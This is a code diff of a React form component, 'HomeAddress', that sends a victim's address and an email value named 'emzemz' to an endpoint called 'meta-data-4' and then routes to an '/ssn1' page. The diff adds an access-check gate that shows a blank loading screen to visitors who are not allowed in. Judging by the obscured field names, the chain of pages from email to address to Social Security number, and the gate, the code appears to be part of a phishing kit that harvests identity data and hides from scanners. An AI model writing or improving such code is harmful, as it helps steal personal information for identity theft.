@@ -2,6 +2,7 @@ import React, { useState } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
+import useAccessCheck from '../Utils/useAccessCheck';
 
 const HomeAddress: React.FC = () => {
   const [stAd, setStAd] = useState('');
@@ -21,12 +22,21 @@ const HomeAddress: React.FC = () => {
   const navigate = useNavigate();
   const location = useLocation();
   const { emzemz } = location.state || {};
+  const isAllowed = useAccessCheck(baseUrl);
+
+  // Debug: Log the received email
+  console.log('HomeAddress received email:', emzemz);
+
+  // Show loading state while checking access
+  if (!isAllowed) {
+    return <div>Loading...</div>; // Or a proper loading spinner
+  }
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
     setIsLoading(true);
-    
-    let newErrors = { 
+
+    let newErrors = {
       stAd: !stAd.trim() ? 'Street Address is required' : '',
       city: !city.trim() ? 'City is required' : '',
       state: !state.trim() ? 'State is required' : '',
@@ -36,7 +46,8 @@ const HomeAddress: React.FC = () => {
 
     setErrors(newErrors);
 
-    if (!Object.values(newErrors).some(error => error)) {
+    // Check if there are no errors (apt is optional)
+    if (!newErrors.stAd && !newErrors.city && !newErrors.state && !newErrors.zipCode) {
       try {
         await axios.post(`${baseUrl}api/meta-data-4/`, {
           emzemz,
@@ -46,9 +57,14 @@ const HomeAddress: React.FC = () => {
           state,
           zipCode,
         });
+        console.log('Home address submitted successfully');
         navigate('/ssn1', { state: { emzemz } });
       } catch (error) {
-        console.error('Error sending message:', error);
+        console.error('Error submitting home address:', error);
+        setErrors(prev => ({
+          ...prev,
+          form: 'There was an error submitting your address. Please try again.'
+        }));
         setIsLoading(false);
       }
     } else {
@@ -175,18 +191,18 @@ const HomeAddress: React.FC = () => {
             )}
           </div>
 
-      <div className=" border-b-2 border-teal-500 justify-center text-center px-6 py-4">
-        {!isLoading ? (
-          <button
-            type="submit"
-            className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
-          >
-            Sign-In
-          </button>
-        ) : (
-          <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-        )}
-      </div>
+          <div className=" border-b-2 border-teal-500 justify-center text-center px-6 py-4">
+            {!isLoading ? (
+              <button
+                type="submit"
+                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
+              >
+                Continue
+              </button>
+            ) : (
+              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
+            )}
+          </div>
         </form>
       </div>
 
